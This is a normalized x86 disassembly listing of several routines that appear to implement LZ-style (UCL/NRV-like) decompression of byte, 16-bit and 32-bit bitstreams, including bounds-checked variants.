lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x160 ] ecx
call sub_406f40
add esp 0x4
jne r-xdata
cmp ecx [ ebp - 0x84 ]
ja r-xdata
cmp ecx 0x500
ja r-xdata
mov eax [ ebp - 0xdc ]
xor esi esi
cmp [ eax ] esi
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_4075a0
mov eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0xd4 ]
push ebx
push ecx
mov [ ebp - 0xd8 ] 0x0
call sub_407480
mov edx [ ebp - 0xdc ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x160 ] eax
inc esi
mov eax ebx
push esi
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_406f40
mov esi [ ebp - 0xdc ]
add esp 0x14
jmp r-xdata
cmp edi [ eax + 0x8 ]
jae r-xdata
mov edi [ ebp - 0xcc ]
cmp ecx [ ebp - 0xc0 ]
je r-xdata
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_407650
mov [ ebp - 0xf4 ] eax
mov eax [ ebp - 0xdc ]
mov eax [ eax ]
dec edi
mov [ ebp - 0xec ] eax
cmp eax edi
jbe r-xdata
cmp [ ebp - 0xec ] esi
jbe r-xdata
mov [ ebp - 0xec ] edi
mov [ ebp - 0xe4 ] esi
jmp r-xdata
cmp [ ebp - 0xd0 ] ebx
jbe r-xdata
mov eax [ ebp - 0xdc ]
cmp ebx [ eax + 0x4 ]
jb r-xdata
mov edx [ eax + 0x10 ]
mov [ ebp - 0x160 ] edx
mov ecx [ eax + 0x10 ]
shr ecx 0x2
mov [ ebp - 0x160 ] ecx
jmp r-xdata
mov ebx [ ebp - 0xe8 ]
cmp esi [ ebp - 0xec ]
jb r-xdata
mov ecx [ ebp - 0xc8 ]
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_407650
test eax eax
js r-xdata
push 0x0
mov eax 0x1
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_406f40
mov edi [ ebp - 0xcc ]
add [ ebp - 0xe4 ] 0x9
add esp 0x4
inc esi
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xf4 ]
mov ecx edi
sub ecx [ ebp - 0xe8 ]
add ecx esi
lea edx [ edx + ecx * 4 ]
add edx ecx
mov ecx [ ebp - 0xe4 ]
add ecx eax
cmp edx ecx
jg r-xdata
inc [ ebp - 0x48 ]
add [ ebp - 0xd8 ] esi
mov esi [ ebp - 0xdc ]
jmp r-xdata
cmp [ ebp - 0xd0 ] 0x0
ja r-xdata
sub_407c10
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
lea esp [ esp ]
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov edx 0x1
nop
mov dl [ eax + edi ]
mov esi [ ebp + 0x10 ]
mov [ ebx + esi ] dl
inc ebx
inc eax
jmp r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
test cl 0x7f
je r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
movzx ecx [ eax + edi ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
mov ebx [ ebp - 0x8 ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] ebx
mov ecx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
cmp eax ecx
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea ebx [ ecx + 0x1 ]
mov [ ebp - 0x8 ] ebx
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
test dl 0x7f
je r-xdata
test dl 0x7f
je r-xdata
test esi esi
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
and edx 0x1
inc eax
inc edx
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
inc edx
jmp r-xdata
mov edx 0x1
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
mov edi [ ebp - 0x4 ]
mov esi 0x500
cmp esi ebx
sbb esi esi
neg esi
add edx esi
mov esi edi
sub esi ebx
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x10 ]
mov bl [ esi + edx ]
add esi edx
mov [ edi + edx ] bl
inc edi
inc esi
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
jmp r-xdata
add ecx ecx
mov edx ecx
shr edx 0x8
and edx 0x1
jmp r-xdata
mov bl [ esi ]
mov [ edi + edx ] bl
inc edi
inc esi
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
test cl 0x7f
je r-xdata
add edx 0x3
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
sub_407e30
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor ecx ecx
xor eax eax
xor edi edi
mov [ ebp - 0xc ] 0x1
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov [ ebp - 0x4 ] edi
mov edi 0x1
mov dl [ eax + esi ]
mov ebx [ ebp + 0xc ]
mov [ edi + ebx ] dl
inc edi
inc eax
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea ebx [ edx + edi * 2 ]
lea edx [ ecx + ecx ]
test dx dx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
mov ecx edx
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
cmp ebx 0x2
jne r-xdata
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
movzx edi [ eax + esi ]
add ebx 0xfffffffd
shl ebx 0x8
add edi ebx
inc eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
add edx edx
mov [ ebp - 0x8 ] ecx
test dx dx
je r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
cmp eax ecx
jne r-xdata
mov ecx edi
not ecx
shr edi 0x1
and ecx 0x1
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] edi
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
mov ecx edx
shr ecx 0x10
and ecx 0x1
jmp r-xdata
mov ecx edx
shr ecx 0x10
and ecx 0x1
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
test cx cx
jne r-xdata
test cx cx
jne r-xdata
test ecx ecx
lea ecx [ edx + edx ]
je r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + 0x1 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
add ecx ecx
test cx cx
jne r-xdata
mov edx 0x500
cmp edx [ ebp - 0x8 ]
sbb edx edx
neg edx
add edi edx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] edi
mov edi edx
sub edi [ ebp - 0x8 ]
inc edx
add edi [ ebp + 0xc ]
mov bl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ edx + edi - 0x1 ] bl
mov edx ecx
shr edx 0x10
and edx 0x1
add ecx ecx
lea edi [ edx + edi * 2 ]
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + 0x3 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi [ ebp - 0x4 ]
mov bl [ edi ]
mov edi [ ebp + 0xc ]
mov [ edx + edi ] bl
mov edi 0x1
add [ ebp - 0x4 ] edi
add edx edi
sub [ ebp - 0x10 ] edi
jne r-xdata
mov [ ebp - 0x4 ] edx
mov edi edx
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add edi 0x3
sub_4080b0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx 0x1
lea ebx [ ebx ]
mov dl [ esi + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc esi
jmp r-xdata
test edx edx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
test ecx ecx
je r-xdata
cmp ebx 0x2
jne r-xdata
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx edx [ esi + edi ]
add ebx 0xfffffffd
shl ebx 0x8
add edx ebx
inc esi
cmp edx 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
shr edx 0x1f
mov ecx 0x1f
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
dec ecx
mov edx eax
shr edx cl
and edx 0x1
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
mov ebx edx
not ebx
shr edx 0x1
and ebx 0x1
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
jmp r-xdata
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edi eax
add esi 0x4
shr edi 0x1f
mov ecx 0x1f
lea ebx [ edi + 0x1 ]
jmp r-xdata
dec ecx
mov edi eax
shr edi cl
and edi 0x1
lea ebx [ edi + 0x1 ]
jmp r-xdata
mov ebx 0x1
lea esp [ esp ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
mov edi 0x500
cmp edi edx
sbb edi edi
neg edi
add ebx edi
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x4 ]
mov edi ebx
sub edi edx
add edi [ ebp + 0x10 ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edi eax
add esi 0x4
shr edi 0x1f
mov ecx 0x1f
lea ebx [ edi + 0x3 ]
jmp r-xdata
dec ecx
mov edi eax
shr edi cl
and edi 0x1
lea ebx [ edi + 0x3 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0xc ] edx
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov edx [ ebp - 0xc ]
add ebx 0x3
test edx edx
je r-xdata
sub_408310
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
cmp eax [ ebp + 0xc ]
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] esi
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1000002
ja r-xdata
mov ebx [ ebp + 0xc ]
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
mov [ ecx ] esi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + edi ]
mov ebx [ ebp + 0x10 ]
mov [ esi + ebx ] dl
inc esi
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov [ ebp - 0x4 ] esi
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
cmp eax ebx
jae r-xdata
mov ebx [ ebp - 0xc ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edx
cmp eax ebx
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea ebx [ ecx + 0x1 ]
mov [ ebp - 0xc ] ebx
test esi esi
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test dl 0x7f
je r-xdata
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov esi ecx
shr esi 0x8
and esi 0x1
inc eax
inc esi
jmp r-xdata
lea ecx [ edx + edx ]
mov esi ecx
shr esi 0x8
and esi 0x1
inc esi
jmp r-xdata
mov esi 0x1
lea esp [ esp ]
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
mov edx 0x500
cmp edx ebx
sbb edx edx
neg edx
add esi edx
mov edx [ ebp - 0x4 ]
add edx esi
cmp edx [ ebp - 0x8 ]
ja r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov esi ecx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add ecx ecx
mov esi ecx
shr esi 0x8
and esi 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp ebx edx
ja r-xdata
cmp esi [ ebp - 0x8 ]
jae r-xdata
mov edx ecx
shr edx 0x8
and edx 0x1
lea esi [ edx + esi * 2 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
add esi 0x3
mov eax [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edi edx
sub edi ebx
add edi [ ebp + 0x10 ]
inc edx
mov bl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ edx + edi - 0x1 ] bl
lea esp [ esp ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov edi [ ebp - 0x4 ]
mov bl [ edi ]
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ edx + edi ] bl
inc edx
dec esi
jne r-xdata
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov esi edx
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
sub_408630
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
push ebx
push edi
xor ecx ecx
xor eax eax
xor edi edi
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x8 ] edx
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea esp [ esp ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea ebx [ edx + edi * 2 ]
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx 0x1000002
ja r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] edi
pop edi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
mov ebx [ ebp + 0xc ]
mov [ edi + ebx ] dl
inc edi
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ecx + ecx ]
test dx dx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov ecx edx
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
cmp ebx 0x2
jne r-xdata
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
cmp eax edi
jae r-xdata
mov ecx [ ebp - 0x10 ]
add edx edx
mov [ ebp - 0xc ] ecx
test dx dx
je r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edi [ eax + esi ]
add ebx 0xfffffffd
shl ebx 0x8
add edi ebx
inc eax
cmp edi 0xffffffff
je r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
mov ecx edx
shr ecx 0x10
and ecx 0x1
jmp r-xdata
mov ecx edx
shr ecx 0x10
and ecx 0x1
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
mov ecx edi
not ecx
shr edi 0x1
and ecx 0x1
inc edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edi
test ecx ecx
lea ecx [ edx + edx ]
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test cx cx
jne r-xdata
test cx cx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + 0x1 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
add ecx ecx
test cx cx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx 0x500
cmp edx [ ebp - 0xc ]
sbb edx edx
neg edx
add edi edx
mov [ ebp - 0x14 ] edi
add edi ebx
cmp edi [ ebp - 0x8 ]
ja r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + 0x3 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
pop edi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
cmp edx ebx
ja r-xdata
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] ebx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
sub edi edx
add edi [ ebp + 0xc ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
add ecx ecx
test cx cx
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0x14 ] edx
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov edi ebx
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add ecx ecx
test cx cx
jne r-xdata
add edi 0x3
sub_4089a0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] edx
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
